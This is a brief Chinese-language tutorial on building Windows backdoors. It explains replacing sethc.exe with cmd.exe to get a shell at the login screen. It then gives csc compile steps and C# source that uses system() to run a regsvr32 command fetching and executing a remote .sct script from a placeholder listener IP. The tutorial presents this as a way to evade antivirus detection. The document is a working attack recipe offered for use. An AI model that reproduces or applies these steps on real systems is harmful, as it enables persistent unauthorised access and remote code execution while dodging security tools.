**1.exe后门:windows后门sethc.exe**

原理：在windows 2000/xp/vista下，按shift键5次会打开粘置，会运行sethc.exe,而且在登录页面可以打开，当我们把这个sethc.exe更换为cmd.exe文件时，就可以得到shell。

**2.如何制作后门文件**

1）用管理员权限打开cmd

2）cmd如下，

`  cd C:\WINDOWS\Microsoft.NET\Framework\v2.0.50727\`

<img src="C:\Users\MCY\AppData\Roaming\Typora\typora-user-images\1619143620256.png" alt="1619143620256"  />

`C:\Windows\Microsoft.NET\Framework\v2.0.50727>csc /t:exe /out:xxx.exe regsvr32.cs

 /t:exe意思是，输出exe文件。
/out:aaa.exe意思是，输出名字叫xxx的exe文件。
regsvr32.cs就是我们利用做免杀的c#文件。
[https://github.com/pasahitz/regsvr32](https://link.jianshu.com?t=https://github.com/pasahitz/regsvr32)
regsvr32.cs这个文件需要单独编辑 

`using System;
using System.Runtime.InteropServices;

namespace Regsvr

{ public class CMD
    { [DllImport("msvcrt.dll")]
        public static extern int system(string cmd);
        public static void Main()
        { system("regsvr32 /s /n /u /i:http://监听者IP:监听的端口/你刚才生成的sct文件 scrobj.dll");
        }}}`

当然这是在windows下生成的后门程序，我们也可以在kali下利用很多模块生产后门程序。
为了免杀，有必要使用免杀技术。

